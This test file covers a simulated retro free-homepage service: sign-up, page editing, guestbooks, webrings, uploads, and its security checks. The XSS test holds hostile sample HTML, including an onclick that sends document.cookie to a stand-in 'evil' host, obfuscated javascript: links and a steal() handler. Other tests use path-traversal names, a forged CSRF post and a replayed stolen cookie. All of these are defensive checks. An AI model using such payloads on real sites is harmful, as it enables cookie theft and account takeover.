// End-to-end tests for GeoSimies (geosimies/), free homepages, run on the real
// SIM95 interpreter: once as the machine's home page, once in /geo/ on a
// SimHost machine, and once moved there by SimHost.
//   node tools/aspsim/geosimies.test.mjs
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { machine, browser as rawBrowser, page } from "./sim.mjs";
import { Network } from "./network.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
let failures = 0;
async function test(name, fn) {
  try { await fn(); console.log("ok    " + name); }
  catch (e) { failures++; console.log("FAIL  " + name + "\n      " + (e.stack || e).toString().split("\n").slice(0, 6).join("\n      ")); }
}
const ok = (r) => {
  assert.equal(r.status, "200 OK", r.url + " -> " + r.status + "\n" + r.body.slice(-400));
  assert.ok(!r.body.includes("ActiveSparkPages error"), r.url + ": " + r.body.slice(r.body.indexOf("ActiveSparkPages error") - 10, r.body.indexOf("ActiveSparkPages error") + 400));
  return r;
};
const installer = (app) => fs.readFileSync(path.join(root, app, "INSTALL.SPK"), "utf8");
// A link on a page, as a path the browser would ask for.
const resolve = (from, href) => { const u = new URL(href.replace(/&amp;/g, "&"), "http://host" + from); return u.pathname + u.search; };
const visitor = (body) => {
  const m = /You are visitor #(.*?)<\/tr><\/table>/.exec(body);
  assert.ok(m, "no hit counter on the page");
  return Number([...m[1].matchAll(/<b>(\d)<\/b>/g)].map((d) => d[1]).join(""));
};
const tokenOf = (body) => (/name="t" value="([0-9A-F]+)"/.exec(body) || [])[1] ?? "";

// A member using GeoSimies' own pages, which carry the form token. rawBrowser
// is somebody else's page aiming a request at GeoSimies: no token.
function browser(m, base) {
  const b = rawBrowser(m);
  const { post } = b;
  b.token = async () => tokenOf((await m.request("GET", base + "upload.asp", { cookies: b.cookies() })).body);
  b.post = async (url, form) => post(url, form && !("t" in form) && !/(join|login|guest)\.asp/.test(url) ? { ...form, t: await b.token() } : form);
  return b;
}

async function signUp(m, base, u, extra = {}) {
  const b = browser(m, base);
  const r = ok(await b.post(base + "join.asp", { name: extra.name || u.toUpperCase(), u, pw: "secret", pw2: "secret", h: extra.h || "AREA95", n: extra.n || "", title: extra.title || "", tpl: extra.tpl || "STARS" }));
  assert.equal(r.url, base + "edit.asp?new=1", "could not sign up " + u + ": " + (/<td bgcolor="#FFFFCC"><font size="2">(.*?)<\/font>/.exec(r.body) || [])[1]);
  return b;
}

// Everything a member does, wherever GeoSimies is (base is "/" or "/geo/").
async function everyday(m, base, dir) {
  const ann = await signUp(m, base, "ann", { name: "Ann Alien", title: "Ann's UFO Page" });
  const bob = await signUp(m, base, "bob", { n: "1005", tpl: "CLASSIC" });
  const cat = await signUp(m, base, "cat", { h: "SIMWOOD", tpl: "SHRINE" });

  await test(dir + ": signing up claims an address in a neighborhood", async () => {
    assert.ok(m.exists(dir + "\\AREA95\\1001\\INDEX.ASP"), "Ann's page is at Area95 1001");
    assert.ok(m.exists(dir + "\\AREA95\\1005\\INDEX.ASP"), "Bob asked for 1005");
    assert.ok(m.exists(dir + "\\SIMWOOD\\1001\\INDEX.ASP"), "Cat is the first in Simwood");
    assert.ok(m.exists("C:\\GEODATA\\SITES\\AREA95\\1001\\INDEX.HTM"), "the page itself is kept outside C:\\WEB");
    assert.ok(!m.read(dir + "\\AREA95\\1001\\INDEX.ASP").includes("Ann"), "the served file holds no member's text");
    const r = ok(await ann.get(base + "edit.asp"));
    assert.match(r.body, /Area95 1001/);
    assert.match(r.body, new RegExp(`http://\\w+${base.replace(/\//g, "\\/")}area95/1001/`));
    // the next free address follows the highest taken one
    assert.match(ok(await rawBrowser(m).get(base + "signup.asp")).body, /next free address: 1006/);
    // taken addresses, bad names, bad neighborhoods
    const nope = async (form, why) => {
      const r = ok(await rawBrowser(m).post(base + "join.asp", { name: "X", u: "dan", pw: "secret", pw2: "secret", h: "AREA95", n: "", title: "", tpl: "BLANK", ...form }));
      assert.match(r.url, /signup\.asp/, JSON.stringify(form));
      assert.match(r.body, why);
    };
    await nope({ n: "1005" }, /Area95 1005 is taken\. Try 1006/);
    await nope({ u: "ann" }, /already has the name ann/);
    await nope({ u: "toolongname" }, /3 to 7 letters/);
    await nope({ u: "../x" }, /3 to 7 letters/);
    await nope({ h: "NOWHERE" }, /Pick a neighborhood/);
    await nope({ n: "12" }, /a number from 1001 to 9999/);
    await nope({ pw2: "other" }, /two passwords are different/);
    assert.ok(!m.exists("C:\\GEODATA\\USERS\\DAN.TXT"));
  });

  await test(dir + ": the homepage is at its address, and at /~name/", async () => {
    const r = ok(await rawBrowser(m).get(base + "area95/1001/"));
    assert.match(r.body, /<title>Ann&#39;s UFO Page<\/title>|<title>Ann's UFO Page<\/title>/);
    assert.match(r.body, /Welcome to my homepage!!!/);
    assert.match(r.body, /<marquee/);
    assert.match(r.body, /<blink>/);
    assert.match(r.body, /src="\.\.\/\.\.\/clipart\/undercon\.pic"/);
    // the clip art is there to be fetched, relative to the page
    const art = await rawBrowser(m).get(resolve(base + "area95/1001/", "../../clipart/undercon.pic"));
    assert.match(art.body, /^SIM95PIC 104 42/);
    const short = await m.request("GET", base + "~ann/");
    assert.match(short.status, /^302/, "a redirect");
    assert.ok(short.headers.includes("Location: " + base + "area95/1001/"), short.headers.join("\n"));
    assert.equal((await rawBrowser(m).get(base + "area95/1002/")).status, "404 Not Found");
  });

  await test(dir + ": editing a page: preview, then publish; and more pages", async () => {
    let r = ok(await ann.get(base + "edit.asp?p=index"));
    assert.match(r.body, /<textarea name="html"[^>]*>&lt;html&gt;/, "the HTML is in the box, escaped");
    const mine = "<html><head><title>Ann's Saucer Shack</title></head><body bgcolor=\"#000000\"><h1>I want to believe</h1><!--COUNTER--></body></html>";
    r = ok(await ann.post(base + "edit.asp", { do: "save", p: "index", html: mine }));
    assert.equal(r.url, base + "area95/1001/?draft=1");
    assert.match(r.body, /PREVIEW/);
    assert.match(r.body, /I want to believe/);
    assert.doesNotMatch(ok(await rawBrowser(m).get(base + "area95/1001/")).body, /I want to believe/, "not on the Web yet");
    // somebody else asking for the preview gets the live page
    assert.doesNotMatch(ok(await rawBrowser(m).get(base + "area95/1001/?draft=1")).body, /I want to believe/);
    // the preview's Publish button
    const t = tokenOf(r.body);
    assert.ok(t, "the preview bar carries the token");
    r = ok(await ann.post(base + "edit.asp", { t, do: "publish", p: "index" }));
    assert.equal(r.url, base + "area95/1001/");
    r = ok(await rawBrowser(m).get(base + "area95/1001/"));
    assert.match(r.body, /I want to believe/);
    assert.doesNotMatch(r.body, /PREVIEW/);
    // a second page, saved straight away
    r = ok(await ann.post(base + "edit.asp", { do: "new", p: "Links", tpl: "BLANK" }));
    assert.equal(r.url, base + "edit.asp?p=links");
    r = ok(await ann.post(base + "edit.asp", { do: "save", p: "links", publish: "1", html: "<html><body><h2>My links</h2><a href=\"./\">home</a></body></html>" }));
    assert.match(r.body, /Saved! Your page is on the Web/);
    assert.match(ok(await rawBrowser(m).get(base + "area95/1001/links.asp")).body, /My links/);
    assert.ok(m.exists(dir + "\\AREA95\\1001\\LINKS.ASP"));
    // and away again
    ok(await ann.post(base + "edit.asp", { do: "delete", p: "links" }));
    assert.equal((await rawBrowser(m).get(base + "area95/1001/links.asp")).status, "404 Not Found");
    assert.ok(!m.exists("C:\\GEODATA\\SITES\\AREA95\\1001\\LINKS.HTM"));
    // the index can't be deleted
    ok(await ann.post(base + "edit.asp", { do: "delete", p: "index" }));
    ok(await rawBrowser(m).get(base + "area95/1001/"));
  });

  await test(dir + ": the hit counter counts each visit, on the server", async () => {
    const first = visitor(ok(await rawBrowser(m).get(base + "area95/1001/")).body);
    const second = visitor(ok(await rawBrowser(m).get(base + "area95/1001/")).body);
    assert.equal(second, first + 1);
    assert.match(ok(await rawBrowser(m).get(base + "area95/1001/")).body, new RegExp("You are visitor #.*" + String(first + 2).padStart(6, "0").split("").join(".*")));
    // the owner's preview isn't a visit
    ok(await ann.post(base + "edit.asp", { do: "save", p: "index", html: "<html><body>draft <!--COUNTER--></body></html>" }));
    assert.equal(Number(m.read("C:\\GEODATA\\SITES\\AREA95\\1001\\INDEX.CNT")), first + 2);
    assert.match(ok(await ann.get(base + "edit.asp")).body, new RegExp(`<b>index</b></font></td>\\s*<td><font size="2">${first + 2} visitors`));
  });

  await test(dir + ": the guestbook: sign it, see it, escaped", async () => {
    const page1 = ok(await rawBrowser(m).get(base + "area95/1001/"));
    const href = /<a href="([^"]*guest\.asp[^"#]*)#sign">Sign my Guestbook/.exec(page1.body)[1];
    const gb = resolve(base + "area95/1001/", href);
    assert.equal(gb, base + "guest.asp?h=area95&n=1001");
    let r = ok(await rawBrowser(m).post(base + "guest.asp", { h: "area95", n: "1001", name: "Mulder <script>", from: "FBI & \"basement\"", msg: "Cool page!!!\n<b>Trust no one</b>" }));
    assert.match(r.url, /e=thanks/);
    assert.match(r.body, /Thanks for signing/);
    assert.match(r.body, /Mulder &lt;script&gt;/);
    assert.match(r.body, /FBI &amp; &quot;basement&quot;/);
    assert.match(r.body, /Cool page!!!<br>&lt;b&gt;Trust no one&lt;\/b&gt;/);
    assert.doesNotMatch(r.body, /<script>|<b>Trust/);
    // too long, or empty
    r = ok(await rawBrowser(m).post(base + "guest.asp", { h: "area95", n: "1001", name: "Scully", from: "", msg: "x".repeat(501) }));
    assert.match(r.body, /under 500 characters/);
    r = ok(await rawBrowser(m).post(base + "guest.asp", { h: "area95", n: "1001", name: "", from: "", msg: "hi" }));
    assert.match(r.body, /Tell us your name/);
    assert.equal(m.read("C:\\GEODATA\\SITES\\AREA95\\1001\\GUEST.TXT").trim().split("\n").length, 1);
    // the counter on the guestbook page counts down as you type
    const p = await page(ok(await rawBrowser(m).get(gb)).body);
    await p.type("msg", "y".repeat(510));
    assert.equal(p.el("msg_n").Text, "10 characters too many");
    assert.equal(p.el("go").Enabled, false);
    // only the owner can take an entry out, and only with the token
    ok(await bob.post(base + "guest.asp", { do: "del", h: "area95", n: "1001", id: "1" }));
    ok(await rawBrowser(m).post(base + "guest.asp", { do: "del", h: "area95", n: "1001", id: "1" }));
    assert.match(m.read("C:\\GEODATA\\SITES\\AREA95\\1001\\GUEST.TXT"), /Mulder/);
    ok(await ann.post(base + "guest.asp", { do: "del", h: "area95", n: "1001", id: "1", t: await ann.token() }));
    assert.doesNotMatch(m.read("C:\\GEODATA\\SITES\\AREA95\\1001\\GUEST.TXT"), /Mulder/);
  });

  await test(dir + ": webrings: create, join, and Prev / Next / Random go round", async () => {
    let r = ok(await ann.post(base + "rings.asp", { do: "create", name: "The <UFO> Ring", desc: "Saucers & such" }));
    assert.match(r.body, /The &lt;UFO&gt; Ring/);
    const id = /ring\.asp\?r=(\d+)/.exec(r.body)[1];
    ok(await bob.post(base + "rings.asp", { do: "join", r: id }));
    ok(await cat.post(base + "rings.asp", { do: "join", r: id }));
    r = ok(await rawBrowser(m).get(base + "ring.asp?r=" + id));
    assert.match(r.body, /Ann&#39;s UFO Page|Ann's UFO Page/);
    assert.equal(m.read("C:\\GEODATA\\RINGS\\" + id + ".TXT"), "area95/1001\narea95/1005\nsimwood/1001\n");
    // the bar at the bottom of a member's page
    const annPage = ok(await rawBrowser(m).get(base + "area95/1001/")).body;
    assert.match(annPage, /\[ <a href="[^"]*">&lt;&lt; Prev<\/a> \| <a href="[^"]*"><b>The &lt;UFO&gt; Ring<\/b><\/a> \| <a href="[^"]*">Next &gt;&gt;<\/a> \| <a href="[^"]*">Random<\/a> \]/);
    const go = async (from, way) => {
      const body = ok(await rawBrowser(m).get(base + from)).body;
      const href = new RegExp(`<a href="([^"]*go=${way}[^"]*)"`).exec(body)[1];
      const res = await m.request("GET", resolve(base + from, href));
      const loc = res.headers.find((h) => h.startsWith("Location: ")).slice(10);
      return resolve(base + "ring.asp", loc).slice(base.length);
    };
    assert.equal(await go("area95/1001/", "next"), "area95/1005/");
    assert.equal(await go("area95/1005/", "next"), "simwood/1001/");
    assert.equal(await go("simwood/1001/", "next"), "area95/1001/", "the last one's Next is the first");
    assert.equal(await go("area95/1001/", "prev"), "simwood/1001/", "the first one's Prev is the last");
    assert.equal(await go("simwood/1001/", "prev"), "area95/1005/");
    const seen = new Set();
    for (let i = 0; i < 12; i++) seen.add(await go("area95/1001/", "rand"));
    assert.ok(!seen.has("area95/1001/"), "Random never stays put");
    assert.deepEqual([...seen].sort(), ["area95/1005/", "simwood/1001/"]);
    // leaving takes you out of the ring
    ok(await bob.post(base + "rings.asp", { do: "leave", r: id }));
    assert.equal(await go("area95/1001/", "next"), "simwood/1001/");
    assert.doesNotMatch(ok(await rawBrowser(m).get(base + "area95/1005/")).body, /UFO/);
  });

  await test(dir + ": the directory and front page link every homepage, for AskSim", async () => {
    let r = ok(await rawBrowser(m).get(base));
    assert.match(r.body, /<a href="hood\.asp\?h=area95">/);
    assert.match(r.body, /<meta name="description"/);
    assert.match(r.body, /Cool Site of the Day/);
    assert.match(r.body, /Just Moved In/);
    r = ok(await rawBrowser(m).get(base + "hood.asp?h=area95"));
    assert.match(r.body, /<a href="area95\/1001\/"><b>Ann&#39;s UFO Page<\/b><\/a>|<a href="area95\/1001\/"><b>Ann's UFO Page<\/b><\/a>/);
    assert.match(r.body, /<a href="area95\/1005\/">/);
    assert.doesNotMatch(r.body, /simwood\/1001/);
    assert.match(r.body, /<title>Area95 - /);
    r = ok(await rawBrowser(m).get(base + "hood.asp"));
    assert.match(r.body, /Toyland/);
    // a page with no title of its own gets the homepage's title and description
    ok(await bob.post(base + "edit.asp", { do: "site", title: "Bob's <Bunker>", desc: "Conspiracies & more" }));
    ok(await bob.post(base + "edit.asp", { do: "save", p: "index", publish: "1", html: "<html><head></head><body>no title here</body></html>" }));
    r = ok(await rawBrowser(m).get(base + "area95/1005/"));
    assert.match(r.body, /<head><title>Bob&#39;s &lt;Bunker&gt;<\/title><meta name="description" content="Conspiracies &amp; more">|<head><title>Bob's &lt;Bunker&gt;<\/title><meta name="description" content="Conspiracies &amp; more">/);
    r = ok(await rawBrowser(m).get(base + "hood.asp?h=area95"));
    assert.match(r.body, /Bob(&#39;|')s &lt;Bunker&gt;/);
    assert.match(r.body, /Conspiracies &amp; more/);
    assert.ok(m.exists(dir + "\\GEOSIMIE.HTM"));
  });
  return { ann, bob, cat };
}

// ---------------------------------------------------------------- at the root

const m = await machine("TESTBOX");
await m.runScript(installer("geosimies"));
let people;

await test("INSTALL.SPK writes every file, and GeoSimies becomes the home page", async () => {
  for (const [src, dest] of [["geosimies/WEB", "C:\\WEB"], ["geosimies/CLIPART", "C:\\WEB\\CLIPART"]]) {
    for (const f of fs.readdirSync(path.join(root, src))) assert.equal(m.read(dest + "\\" + f.toUpperCase()), fs.readFileSync(path.join(root, src, f), "utf8"), f);
  }
  assert.ok(m.exists("C:\\WEB\\WELCOME.HTM"), "the stock home page steps aside");
  const r = ok(await rawBrowser(m).get("/"));
  assert.match(r.body, /Welcome to GeoSimies/);
  assert.match(r.body, /Get your FREE homepage now/);
});

await test("the about page is 8.3 and full of keywords", async () => {
  const r = ok(await rawBrowser(m).get("/geosimie.htm"));
  assert.match(r.body, /<meta name="keywords" content="free homepage, free web hosting/);
  assert.match(r.body, /<meta name="description" content="GeoSimies is free web hosting/);
});

people = await everyday(m, "/", "C:\\WEB");
const { ann, bob } = people;

await test("member HTML is theirs on their page, and escaped everywhere else", async () => {
  const evil = "<html><body><h1>Hi</h1><textarea></textarea><p onclick=\"Spin\">spin</p>"
    + "<p onclick=\"document.location='http://evil/?'+document.cookie\">x</p><a href=\"javascript:alert(document.cookie)\">y</a>"
    + "<a href=\"jav&#97;script:alert(1)\">z</a><SCRIPT language=\"JavaScript\">alert(document.cookie)</SCRIPT><body onload='steal()'><p>contact me</p></body></html>";
  ok(await ann.post("/edit.asp", { do: "save", p: "index", publish: "1", html: evil }));
  // the editor shows it escaped, in the box
  let r = ok(await ann.get("/edit.asp?p=index"));
  assert.match(r.body, /&lt;textarea&gt;&lt;\/textarea&gt;/);
  assert.match(r.body, /&lt;SCRIPT language=&quot;JavaScript&quot;&gt;/);
  assert.equal((r.body.match(/<textarea/g) || []).length, 1, "only the editor's own box");
  // on the page itself: HTML yes, JavaScript no
  r = ok(await rawBrowser(m).get("/area95/1001/"));
  assert.match(r.body, /<h1>Hi<\/h1><textarea><\/textarea>/);
  assert.match(r.body, /<p onclick="Spin">spin<\/p>/, "a SPARK SUB's name is fine");
  assert.match(r.body, /<p noclick="document\.location=/, "JavaScript in onclick is switched off");
  assert.doesNotMatch(r.body, /javascript:/i);
  assert.doesNotMatch(r.body, /jav&#97;script/);
  assert.match(r.body, /<script type="spark">alert\(document\.cookie\)/, "a JavaScript script becomes SPARK, which can't see cookies");
  assert.match(r.body, /<body noload='steal\(\)'>/);
  assert.match(r.body, /<p>contact me<\/p>/, "words that merely contain 'on' are left alone");
  // the front page, directory and ring pages escape titles
  ok(await ann.post("/edit.asp", { do: "site", title: "<i>Ann</i>", desc: "<script>x</script>" }));
  for (const url of ["/", "/hood.asp?h=area95", "/edit.asp", "/ring.asp?r=1"]) {
    r = ok(await ann.get(url));
    assert.doesNotMatch(r.body, /<i>Ann<\/i>|<script>x/, url);
  }
  r = ok(await ann.get("/edit.asp"));
  assert.match(r.body, /value="&lt;i&gt;Ann&lt;\/i&gt;"/);
});

await test("page size limits keep every page and request inside one 64K message", async () => {
  // too long, and too many characters that grow when escaped
  let r = ok(await ann.post("/edit.asp", { do: "save", p: "index", publish: "1", html: "a".repeat(16001) }));
  assert.match(r.body, /That page is 16001 characters. A GeoSimies page holds 16000/);
  r = ok(await ann.post("/edit.asp", { do: "save", p: "index", publish: "1", html: "&".repeat(9000) }));
  assert.match(r.body, /too many special characters/);
  // the worst page allowed still fits: in the editor, on the Web, and in the preview
  // (each < is &lt; in the editor: 8000 of them and 8000 more characters is the most)
  const worst = "<".repeat(8000) + "x".repeat(8000);
  assert.equal(worst.length, 16000);
  r = ok(await ann.post("/edit.asp", { do: "save", p: "index", publish: "1", html: worst }));
  assert.match(r.body, /Saved!/);
  assert.ok(r.raw.length < 60000, "the editor: " + r.raw.length);
  r = ok(await rawBrowser(m).get("/area95/1001/"));
  assert.ok(r.raw.length < 30000, "the page: " + r.raw.length);
  // the box counts down, and greys out Save when over
  const p = await page(ok(await ann.get("/edit.asp?p=index")).body);
  await p.type("html", "z".repeat(16005));
  assert.equal(p.el("html_n").Text, "5 characters too many");
  assert.equal(p.el("go").Enabled, false);
  // pages per homepage
  for (let i = 2; i <= 6; i++) ok(await bob.post("/edit.asp", { do: "new", p: "page" + i, tpl: "STARS" }));
  r = ok(await bob.post("/edit.asp", { do: "new", p: "seventh", tpl: "BLANK" }));
  assert.match(r.body, /room for 6 pages/);
  // a full guestbook page stays small too
  for (let i = 0; i < 60; i++) {
    const msg = "&".repeat(500);
    await rawBrowser(m).post("/guest.asp", { h: "area95", n: "1005", name: "<".repeat(40), from: "&".repeat(60), msg });
  }
  r = ok(await rawBrowser(m).get("/guest.asp?h=area95&n=1005"));
  assert.ok(r.raw.length < 50000, "the guestbook: " + r.raw.length);
  assert.match(r.body, /older entries/);
  assert.equal(m.read("C:\\GEODATA\\SITES\\AREA95\\1005\\GUEST.TXT").trim().split("\n").length, 60);
});

await test("pictures: upload one, use it, refuse big ones and too many", async () => {
  const pic = "SIM95PIC 4 2\n0F0F\nF0F0\n";
  let r = ok(await ann.post("/upload.asp", { pic, "pic.filename": "C:\\MYFILES\\ME.PIC", name: "" }));
  assert.match(r.body, /Got it!/);
  assert.equal(m.read("C:\\WEB\\AREA95\\1001\\ME.PIC"), pic);
  assert.equal((await rawBrowser(m).get("/area95/1001/me.pic")).body, pic);
  assert.match(r.body, /<img src="area95\/1001\/me\.pic"/);
  r = ok(await ann.post("/upload.asp", { pic: "hello", name: "x" }));
  assert.match(r.body, /not a picture/);
  r = ok(await ann.post("/upload.asp", { pic: "SIM95PIC 201 10\n" + "0".repeat(201), name: "big" }));
  assert.match(r.body, /up to 200 by 200/);
  r = ok(await ann.post("/upload.asp", { pic: "SIM95PIC 200 200\n" + ("0".repeat(200) + "\n").repeat(200), name: "big" }));
  assert.match(r.body, /40K/);
  r = ok(await ann.post("/upload.asp", { pic, name: "../up" }));
  assert.match(r.body, /1 to 8 letters or digits/);
  for (let i = 2; i <= 10; i++) ok(await ann.post("/upload.asp", { pic, name: "p" + i }));
  r = ok(await ann.post("/upload.asp", { pic, name: "eleven" }));
  assert.match(r.body, /room for 10 pictures/);
  ok(await ann.post("/upload.asp", { del: "p10" }));
  assert.ok(!m.exists("C:\\WEB\\AREA95\\1001\\P10.PIC"));
  // the clip art library is offered with its own paths
  r = ok(await ann.get("/upload.asp"));
  for (const c of ["undercon", "emailme", "globe", "bestview"]) {
    assert.match(r.body, new RegExp(`<img src="clipart/${c}.pic"`));
    assert.match(m.read("C:\\WEB\\CLIPART\\" + c.toUpperCase() + ".PIC"), /^SIM95PIC \d+ \d+\n[0-9A-F]+\n/);
  }
});

await test("changes need the form token; sign-ins need the right machine", async () => {
  const before = m.read("C:\\GEODATA\\SITES\\AREA95\\1001\\INDEX.HTM");
  // another site's page posting with Ann's cookie, but no token
  const forger = rawBrowser(m);
  await ann.get("/edit.asp");
  const jar = ann.cookies();
  let r = await m.request("POST", "/edit.asp", { body: "do=save&p=index&publish=1&html=hacked", cookies: jar });
  assert.match(r.headers.join("\n"), /Location: edit\.asp\?why=/);
  assert.equal(m.read("C:\\GEODATA\\SITES\\AREA95\\1001\\INDEX.HTM"), before);
  r = await m.request("POST", "/rings.asp", { body: "do=create&name=Forged", cookies: jar });
  assert.doesNotMatch(m.read("C:\\GEODATA\\RINGS.TXT"), /Forged/);
  r = await m.request("GET", "/logout.asp", { cookies: jar });
  assert.ok(ok(await ann.get("/edit.asp")).body.includes("Welcome home"), "still signed in");
  void forger;
  // a stolen cookie used from another machine is no good
  const session = /geosimies=([0-9A-F]+)/.exec(jar)[1];
  const file = "C:\\GEODATA\\SESSIONS\\" + session + ".TXT";
  const lines = m.read(file).split("\n");
  m.write(file, lines[0] + "\n" + lines[1] + "\n65.240.0.77");
  r = await ann.get("/edit.asp");
  assert.match(r.url, /index\.asp\?e=login/);
  m.write(file, lines.join("\n"));
  // passwords are salted and hashed
  assert.doesNotMatch(m.read("C:\\GEODATA\\USERS\\ANN.TXT"), /secret/);
  assert.match(m.read("C:\\GEODATA\\USERS\\ANN.TXT"), /^salt=[0-9A-F]+$/m);
  // logging out and in again
  r = ok(await ann.get("/logout.asp?t=" + (await ann.token())));
  assert.match(r.body, /You have logged out/);
  r = ok(await ann.post("/login.asp", { u: "ann", pw: "wrong" }));
  assert.match(r.body, /do not match/);
  r = ok(await ann.post("/login.asp", { u: "ann", pw: "secret" }));
  assert.equal(r.url, "/edit.asp");
});

await test("pages from the templates compile as Voyager page scripts", async () => {
  for (const tpl of ["STARS", "CLASSIC", "SHRINE", "BLANK"]) {
    const html = m.read("C:\\WEB\\" + tpl + ".TPL");
    const { load } = await import("./sim.mjs");
    const S = await load();
    const c = S.pageCompile(html);
    assert.ok(!c.hasScript || c.script, tpl + ": " + (c.errors || []).map((e) => e.message).join("; "));
  }
});

await test("every page stays well inside the time limit", async () => {
  // a busy GeoSimies: 150 homepages
  const lines = [];
  for (let i = 0; i < 150; i++) lines.push(`${2000 + i}|u${i}|${"&".repeat(60)}|${"<".repeat(200)}|1996-01-01`);
  m.write("C:\\GEODATA\\HOODS\\TOYLAND.TXT", lines.join("\n") + "\n");
  for (const url of ["/", "/hood.asp?h=toyland", "/hood.asp", "/signup.asp", "/rings.asp", "/edit.asp", "/area95/1001/", "/guest.asp?h=area95&n=1005"]) {
    const r = await m.request("GET", url, { cookies: ann.cookies(), budget: 4000 });
    assert.ok(!r.body.includes("ActiveSparkPages error"), url + ": " + r.body.slice(0, 300));
    assert.ok(r.raw.length < 60000, url + " is " + r.raw.length);
  }
});

// ---------------------------------------------------------------- on a SimHost machine

const net = new Network();
const wait = (fn, what, ms = 20000) => net.until(fn, ms, what);
async function install(machine, app) {
  machine.write("C:\\MYFILES\\INSTALL.SPK", installer(app));
  const pid = machine.run("C:\\MYFILES\\INSTALL.SPK");
  await wait(() => !machine.running(pid) || /in Voyager/.test(machine.output(pid)), app + "'s installer", 30000);
  assert.deepEqual(machine.ui.dialogs, [], app + ": " + machine.output(pid));
  return machine.output(pid);
}

const host = await net.boot("HOST");
await test("on a SimHost machine GeoSimies goes in /geo/ and the front page lists it", async () => {
  await install(host, "simhost");
  const said = await install(host, "geosimies");
  assert.match(said, /Open http:\/\/host\/geo\/ in Voyager/);
  assert.ok(host.exists("C:\\WEB\\GEO\\GEO.SPK") && host.exists("C:\\WEB\\GEO\\CLIPART\\GLOBE.PIC"));
  assert.ok(!host.exists("C:\\WEB\\GEO.SPK"));
  const home = ok(await rawBrowser(host).get("/"));
  assert.match(home.body, /<a href="\/geo\/">.*GeoSimies/);
  assert.match(home.body, /SimHost's front door|web app/);
  ok(await rawBrowser(host).get("/geo/"));
});

await everyday(host, "/geo/", "C:\\WEB\\GEO");

await test("SimHost moves a GeoSimies that was the home page into /geo/, homepages and all", async () => {
  const old = await net.boot("OLDGEO");
  await install(old, "geosimies");
  await signUp(old, "/", "zed", { h: "STADIUM" });
  ok(await rawBrowser(old).get("/stadium/1001/"));
  assert.ok(old.exists("C:\\WEB\\~ZED\\INDEX.ASP"));
  const said = await install(old, "simhost");
  assert.match(said, /moved GeoSimies \(\d+ files\) into C:\\WEB\\GEO/);
  assert.ok(old.exists("C:\\WEB\\GEO\\STADIUM\\1001\\INDEX.ASP") && old.exists("C:\\WEB\\GEO\\CLIPART\\UNDERCON.PIC"));
  // the front page puts the ~name shortcuts right
  ok(await rawBrowser(old).get("/geo/"));
  assert.ok(!old.exists("C:\\WEB\\~ZED"), "the old shortcut is gone");
  const short = await old.request("GET", "/geo/~zed/");
  assert.ok(short.headers.includes("Location: /geo/stadium/1001/"), short.headers.join("\n"));
  const r = ok(await rawBrowser(old).get("/geo/stadium/1001/"));
  assert.match(r.body, /You are visitor #/);
  assert.match(r.body, /href="\.\.\/\.\.\/guest\.asp\?h=stadium&n=1001#sign"/);
  // and the member can still sign in and edit, from the folder
  const b = browser(old, "/geo/");
  assert.equal(ok(await b.post("/geo/login.asp", { u: "zed", pw: "secret" })).url, "/geo/edit.asp");
});

net.shutdown();
console.log(failures ? `\n${failures} failed` : "\nall passed");
process.exit(failures ? 1 : 0);
